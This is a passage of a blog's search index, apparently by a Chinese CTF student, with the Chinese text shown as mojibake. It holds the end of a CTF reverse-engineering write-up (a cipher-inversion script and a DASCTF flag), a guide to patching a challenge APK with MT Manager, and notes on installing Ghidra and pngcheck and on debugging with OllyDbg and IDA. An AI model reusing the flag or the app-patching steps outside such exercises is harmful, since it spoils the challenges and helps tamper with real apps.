class="hljs-number">16</span>;i++)&#123;<br>s[i]=s[i]^(<span class="hljs-number">120</span>*m);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)&#123;<br>s[i]=(s[i]&lt;&lt;<span class="hljs-number">5</span>)|(s[i]&gt;&gt;<span class="hljs-number">3</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)&#123;<br>tmp[i]=s[v4[i]];<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)&#123;<br><span class="hljs-type">char</span> v1=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">8</span>;j++)&#123;<br>v1|=((tmp[i]&gt;&gt;j)&amp;<span class="hljs-number">1</span>)&lt;&lt;(<span class="hljs-number">7</span>-j);<br>&#125;<br>tmp[i]=v1;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">16</span>;i++)&#123;<br>s[i]=tmp[i];<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;m&lt;<span class="hljs-number">16</span>;m++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[m]);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;s<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨ctypes</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ctypes<br><br>xmm = [<span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000005</span>,<br>       <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x00000008</span>,<br>       <span class="hljs-number">0x0000000A</span>,<span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000009</span>,<br>       <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0xe</span>]<br><br>enc = [<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x38</span>,<br>       <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4C</span>,<br>       <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x4E</span>,<br>       <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x71</span>]<br><br>enc = [ctypes.c_uint8(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<span class="hljs-comment">#ç¡®ä¿encä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯8ä½æ— ç¬¦å·æ•´æ•°ã€‚</span><br><br><span class="hljs-comment">#print(enc)</span><br><br><span class="hljs-keyword">for</span> mm <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># enc1</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            enc[j+mm*<span class="hljs-number">16</span>].value ^= (<span class="hljs-number">0x78</span> * i)<br>        <span class="hljs-comment"># enc2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            enc[j+mm*<span class="hljs-number">16</span>].value = (enc[j+mm*<span class="hljs-number">16</span>].value &gt;&gt; <span class="hljs-number">3</span>) | (enc[j+mm*<span class="hljs-number">16</span>].value &lt;&lt; <span class="hljs-number">5</span>)<br>        <span class="hljs-comment"># enc3</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        æ­£å‘</span><br><span class="hljs-string">        tmp[xmm[j]] = enc[j]</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        tmp = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> xx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            tmp[j] = enc[xmm[j]+mm*<span class="hljs-number">16</span>].value<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            enc[j+mm*<span class="hljs-number">16</span>].value = tmp[j]<br>        <span class="hljs-comment"># enc4</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        0--&gt;7</span><br><span class="hljs-string">        1--&gt;6</span><br><span class="hljs-string">        2--&gt;5</span><br><span class="hljs-string">        3--&gt;4</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            v1 = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                v1 |= ((enc[j+mm*<span class="hljs-number">16</span>].value &gt;&gt; k) &amp; <span class="hljs-number">1</span>) &lt;&lt; (<span class="hljs-number">7</span> - k)<br>            <span class="hljs-comment"># print(bin(enc[j].value),bin(v1))</span><br>            enc[j+mm*<span class="hljs-number">16</span>].value = v1<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i].value),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>DASCTF&#123;51bWZvM0p1xNHLo3A1ndrVH0|VsED3LFyRwYkEVeRqeFSNE!<span class="hljs-number">0</span>!oyUki!&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç®€å•ä½¿ç”¨MTç®¡ç†å™¨</title>
    <link href="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    <url>/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©çœ‹åˆ°0xGameçš„0x14537a60å¸ˆå‚…æåˆ°äº†MTç®¡ç†å™¨ï¼Œå°±å»ç ”ç©¶äº†ä¸€ä¸‹</p><p>è¿™æ˜¯0xGame week3çš„ç¬¬ä¸‰é¢˜</p><p>é¦–å…ˆæŠŠapkæ–‡ä»¶æ”¾åˆ°tmpæ–‡ä»¶å¤¹ï¼Œå› ä¸ºåœ¨åŸæ–‡ä»¶æ²¡æœ‰ä¿®æ”¹æƒé™</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/1.jpg" class=""><p>éšä¾¿æ‰¾ä¸€ä¸ªtmpæ–‡ä»¶å¤¹æ”¾å°±è¡Œ</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/2.jpg" class=""><p>å»ç”µè„‘ä¸Šæ‰¾åˆ°onClickç»å¯¹è·¯å¾„</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/3.png" class=""><p>ç”¨dexç¼–è¾‘å™¨æ‰“å¼€classes.dex,è‹¥æœ‰å¤šä¸ªä¸€èˆ¬éƒ½æ˜¯æœ€åä¸€ä¸ªdex</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/4.jpg" class=""><p>æ‰¾åˆ°æ–¹æ³•</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/5.jpg" class=""><p>è¿›å»çœ‹æ–¹æ³•ï¼ŒåŸæ¥æ˜¯v4ï¼Œæ”¹æˆv1</p><p>è¿™é‡Œä¸ºä»€ä¹ˆè¿™æ ·æ”¹å‘¢ï¼Œæˆ‘çš„æƒ³æ³•æ˜¯ç¬¬åè¡Œresult-objectï¼Œè¿˜æœ‰å°±æ˜¯ç¬¬ä¹è¡Œv1,v2å’Œv3åœ¨ä¸€èµ·å‡ºç°</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/6.jpg" class=""><p>å†é‡æ–°å®‰è£…åè¿è¡Œ</p><img src="/2023/10/26/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/7.jpg" class=""><p>æµ…æµ…å­¦äº†ä¸€ä¸‹ï¼Œå¸Œæœ›å¯¹ä»¥åæœ‰ç‚¹å¸®åŠ©</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£…pngcheck</title>
    <link href="/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/"/>
    <url>/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/</url>
    
    <content type="html"><![CDATA[<p>é˜¿é‡Œäº‘çš„æºæ‰¾ä¸åˆ°åŒ…</p><img src="/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/1695737968243-87e7a061-8436-4375-aae7-39bca5a291e6.png" class="" title="img"><p>åŒå­¦åæ˜ å¯èƒ½æ˜¯ç”¨äº†é˜¿é‡Œäº‘æºçš„ç¼˜æ•…ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ¢æºï¼Œç”¨kaliåŸæ¥çš„æºå°±èƒ½ä¸€é”®æˆåŠŸ</p><img src="/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/1695738257858-862a66bc-871b-48be-b183-1daa9d0b9d8d.png" class="" title="img"><p>ç¿»githubæ‰¾åˆ°ä¸€ä¸ªæ›´æ–°çš„ç½‘ç«™ï¼Œä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬å°±è¡Œäº†</p><img src="/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/1695737936166-d9838d33-6c94-46f8-b1dd-fd7f3999a96a.png" class="" title="img"><img src="/2023/09/26/%E5%AE%89%E8%A3%85pngcheck/1695737866998-d5a52522-3c03-4b2b-bcd7-36f95acd13e5.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£…ghidra</title>
    <link href="/2023/09/08/%E5%AE%89%E8%A3%85ghidra/"/>
    <url>/2023/09/08/%E5%AE%89%E8%A3%85ghidra/</url>
    
    <content type="html"><![CDATA[<p>å®‰è£…å®Œghidraè¦å†™jdk17çš„ç›®å½•ï¼ˆghidraé«˜ç‰ˆæœ¬è¦æ±‚java17åŠä»¥ä¸Šï¼‰ï¼Œç”µè„‘ä¸Šåªæœ‰jdk1.8ï¼ŒæŒ‰ä¸‹é¢æ•™ç¨‹åˆ‡æ¢javaç‰ˆæœ¬å³å¯</p><img src="/2023/09/08/%E5%AE%89%E8%A3%85ghidra/1694153302506-731218f9-c283-4e36-87d5-a97bba467df1.png" class="" title="img"><p>[<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]</a>(<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=ä¸€ã€windowså®‰è£…java17ä¸java8å…±å­˜ã€centoså®‰è£…java17</a> 1 1. java17ä¸‹è½½ ä¸‹è½½é“¾æ¥ï¼ˆ https%3A%2F%2F<a href="http://www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows">www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows</a> ï¼‰ 2,æŸ¥çœ‹javaç›®å½• [root%40r01 ~]which java %2Fusr%2Fbin%2Fjava 1 2 )</p><p>æäº†ä¸¤ä¸ªå°æ—¶ï¼Œæœ‰ç‚¹æŠ˜ç£¨ï¼Œå¤šå…³æ³¨æŠ¥é”™å’Œè¦æ±‚å…¶å®èƒ½å¾ˆå¿«è§£å†³</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å’Œä»£ç†çš„ä¸€äº›æ•…äº‹</title>
    <link href="/2023/08/19/%E5%92%8C%E4%BB%A3%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%85%E4%BA%8B/"/>
    <url>/2023/08/19/%E5%92%8C%E4%BB%A3%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%85%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<p>å¿˜ç»™æ¢¯å­ç»­è´¹äº†ï¼Œedgeå’Œè°·æ­Œéƒ½ä¸èƒ½ç”¨äº†ï¼ŒæŠ¥äº†ç½‘ç»œè½¬æ¢é”™è¯¯ï¼Œç™¾åº¦ä¸Šä¸€æŸ¥è®©æˆ‘é‡ç½®ç½‘ç»œï¼Œä¸€ç‚¹ä¸çŸ¥é“åæœå°±å»è¯•äº†ï¼ŒæŠ¥é”™äº†æˆ‘è¿˜ä»¥ä¸ºæ²¡äº‹ï¼Œé‡å¯åå°±ä¸å¯¹äº†ã€‚ç™¾åº¦æœç„¶é ä¸ä½ï¼Œè¿‡ä¸€ä¼šè”æƒ³æµè§ˆå™¨ä¸Šæ‰€æœ‰ä¹¦ç­¾éƒ½æ²¡äº†ï¼Œå¤§æƒŠï¼</p><p>æ™šé¥­è¿‡åæäº†å¥½ä¹…éƒ½æ‰¾åˆ°æŠŠé‡ç½®çš„ç½‘ç»œæ¢å¤çš„æ–¹æ³•ï¼Œç³»ç»Ÿè¿˜åŸäº†ä¹ŸæŠ¥é”™äº†ï¼ŒæœŸé—´è¦æ”¹æ³¨å†Œè¡¨ï¼Œqetxè¯´è¦æˆä»ï¼Œæˆ‘è§‰å¾—ä¹Ÿè¿˜è¡Œï¼Œæœ€åå¥½åœ¨ç³»ç»Ÿæ²¡ä»€ä¹ˆäº‹ï¼Œæœ€ååªèƒ½æƒ³ç€æ‰¾æµè§ˆè®°å½•å»è¡¥æ”¶è—å¤¹äº†ğŸ˜«ğŸ˜«</p><p>æ²¡è¡¥å‡ ä¸ªçªç„¶çœ‹åˆ°æ”¶è—å¤¹é‚£è¾¹æœ‰ä»€ä¹ˆå¯¼å…¥ï¼Œä¸€ç‚¹ï¼Œå“‡ï¼Œéƒ½å›æ¥äº†ã€‚</p><p>æˆ‘è™½ç„¶æƒ³ä¸æ˜ç™½åŸç†ï¼Œä½†è¿˜æ˜¯å¾ˆæƒŠå–œï¼Œç®—æ˜¯ä¸å¹¸ä¸­çš„ä¸‡å¹¸ï¼</p><p>ä»æ­¤ä»¥åéƒ½ä¹°ä¸¤ä¸ªä»£ç†ä»¥å¤‡ä¸æµ‹</p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ODä¸IDAç»“åˆåŠ¨è°ƒ</title>
    <link href="/2023/07/22/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/"/>
    <url>/2023/07/22/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>æ™šä¸Šå¬å°§å“¥è¯´DASFCTFçš„ä¸€é“reé¢˜éœ€è¦åŠ¨è°ƒæ¥åˆ¤æ–­å‡½æ•°å…ˆåæ‰§è¡Œçš„é¡ºåºï¼Œå¥½åƒä¸€ä¸‹å­å°±æ‚Ÿäº†ï¼Œä½†æ‚Ÿå¾—ä¸å¤šï¼Œè¿˜æ²¡å®Œå…¨è°ƒå‡ºæ¥ã€‚ä¸»è¦ç½‘ä¸Šè®²åŠ¨æ€çš„è§†é¢‘å¤ªå°‘ï¼ŒåªçŸ¥é“åŸºæœ¬å¿«æ·é”®è¿˜æ˜¯å¾ˆéš¾åŠ¨è°ƒï¼Œæ‰€ä»¥è¿™é‡Œè®°å½•ä¸€ä¸‹</p><p>1.è¿˜æœ‰ä¸€ç‚¹å½“å‡½æ•°è¾ƒå¤æ‚æ—¶ï¼Œä¼ªcä¼šä¸å‡†ï¼Œå³æ”¾åœ¨å‰é¢çš„å‡½æ•°ä¸ä¸€å®šå…ˆè¿è¡Œï¼Œæ‰€ä»¥éœ€è¦çœ‹ODçš„æ±‡ç¼–ï¼Œé…åˆIDAçš„ä¼ªcä»£ç </p><p>2.ä¸€èˆ¬å…ˆæ˜¯åœ¨mainå‡½æ•°çš„inputä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åf8å•æ­¥æ‰§è¡Œï¼Œå½“æ±‡ç¼–åœ°å€æœ‰è¾ƒå¤§å˜åŒ–çš„æ—¶å€™è¦å»IDAé‡Œç›¸åº”çš„æ±‡ç¼–åœ°å€ï¼Œç„¶åæŒ‰tabï¼Œçœ‹çœ‹ç°åœ¨ä½äºå“ªä¸ªå‡½æ•°ï¼Œä»¥æ­¤æ¥åˆ¤æ–­åŠ å¯†å‡½æ•°çš„æ‰§è¡Œå…ˆåé¡ºåºï¼Œé‡åˆ°æ±‡ç¼–å¾ªç¯ï¼Œå¯ä»¥ç‚¹åˆ°æ±‡ç¼–å¾ªç¯çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼Œç„¶åf4åˆ°è¯¥ä½ç½®ï¼Œå¿«é€Ÿè·³å‡ºå¾ªç¯ï¼Œå› ä¸ºODæ˜¯çº¿æ€§æ‰«æï¼Œæ‰€ä»¥æœ¬æ¥å¾ªç¯ç»“æŸä¹Ÿæ˜¯åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œä¸¤ä¸ªè½¯ä»¶çš„ç•Œé¢å»ºè®®ä¸€å·¦ä¸€å³ï¼Œè¿™æ ·å°±ä¸ç”¨ä¸€ç›´åˆ‡ç•Œé¢ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚</p><img src="/2023/07/22/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/1690079441955-4d727ec8-c82d-4ece-a8b9-76ac0741bdec.png" class="" title="img"><p>3.æ¯æ¬¡è°ƒè¯•é«˜å‡ ä½çš„åœ°å€ä¸ä¸€æ ·ï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œå…ˆåœ¨IDAé‡Œå¼€å¯è°ƒè¯•ï¼Œæ±‡ç¼–ç•Œé¢çš„åœ°å€å°±èƒ½å’ŒODé‡Œé¢å¯¹åº”äº†</p><p>4.æ±‡ç¼–é‡Œé¢æœ‰å‡½æ•°è°ƒç”¨å‡½æ•°ï¼ˆcallï¼‰è¦æŒ‰f7è¿›å…¥ï¼Œæ­¤å¤–ï¼Œçœ‹ä¼ªcä»£ç ä¹Ÿå¯ä»¥çœ‹å‡ºä¸€äº›å‡½æ•°è°ƒç”¨å…³ç³»</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
